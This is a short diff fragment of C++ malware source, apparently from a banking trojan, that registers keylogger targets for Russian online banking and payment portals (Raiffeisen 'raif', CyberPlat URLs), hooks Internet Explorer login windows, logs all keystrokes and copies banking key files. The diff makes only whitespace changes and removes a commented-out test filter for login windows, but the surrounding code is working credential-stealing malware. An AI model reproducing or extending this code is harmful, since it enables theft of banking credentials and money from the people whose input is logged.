@@ -246,7 +246,7 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp)
 	PKeyLogSystem S;
 
 	// Добавляем систему raif
-	S = KeyLogger::AddSystem("raif", PROCESS_HASH_IE);
+	 S = KeyLogger::AddSystem("raif", PROCESS_HASH_IE);
 	if (S != NULL)
 	{
 		char RafaCaption[] = {
@@ -257,6 +257,7 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp)
 		S->OnActivate   = Rafa::CopyRafaKeyFiles;
 		PKlgWndFilter F = KeyLogger::AddFilter(S, true, true, RafaClass, (PCHAR)RafaCaption, FILTRATE_PARENT_WND, LOG_ALL, 3);
 	}
+	
 
 	//http://www.cyberplat.ru/tech/online/
 	//https://portal.cyberplat.ru/cgi-bin/login.cgi
@@ -324,17 +325,6 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp)
 	#ifdef CCModule
 		CC::Init(hashApp);
 	#endif
-
-//	#ifdef TEST_APP
-//
-//		S = KeyLogger::AddSystem("Test_APP", 0);
-//		if (S != NULL)
-//		{
-//			PKlgWndFilter F = KeyLogger::AddFilter(S, true, true, NULL, "*Вход*", FILTRATE_PARENT_WND, LOG_KEYBOARD, 3);
-//
-//			KeyLogger::AddFilterText(F, NULL, "*Вхід*");
-//		}
-//	#endif
 }
 
 
